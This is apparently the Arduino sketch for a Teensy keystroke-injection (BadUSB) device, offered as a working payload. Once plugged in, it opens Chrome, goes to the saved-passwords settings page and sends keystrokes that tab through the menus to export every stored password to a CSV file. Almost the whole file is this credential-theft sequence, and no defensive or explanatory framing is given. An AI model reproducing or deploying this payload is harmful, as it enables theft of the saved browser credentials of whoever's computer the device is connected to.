#define LED 13 // Onboard LED for Teensy

void setup() {
  pinMode(LED, OUTPUT);
  digitalWrite(LED, LOW);

  // Flash the LED to notify start of cycle
  // Pick 10 rounds for high risk payloads
  for (int i = 0; i < 10; i++) {
    digitalWrite(LED, HIGH);
    delay(20);
    digitalWrite(LED, LOW);
    delay(100);
  }

  // Wait for 5 seconds
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.print("chrome");
  delay(100);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(500);
  
  Keyboard.press(KEY_F6);
  Keyboard.release(KEY_F6);
  delay(200);
  Keyboard.print("chrome://settings/passwords");
  delay(200);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(200);

  // Tab to search
  for (int i = 0; i < 8; i++) {
    Keyboard.press(KEY_TAB);
    Keyboard.release(KEY_TAB);
    delay(50);
  }

  // Enter menu
  for (int i = 0; i < 2; i++) {
    Keyboard.press(KEY_ENTER);
    Keyboard.release(KEY_ENTER);
    delay(200);
  }

  // Export CSV
  for (int i = 0; i < 2; i++) {
    Keyboard.press(KEY_TAB);
    Keyboard.release(KEY_TAB);
    delay(50);
  }

  delay(150);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
  delay(500);
  Keyboard.print("0");
  delay(100);
  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);
}


void loop() {
  // put your main code here, to run repeatedly:
  digitalWrite(LED, HIGH);
  delay(200);
  digitalWrite(LED, LOW);
  delay(100);
}
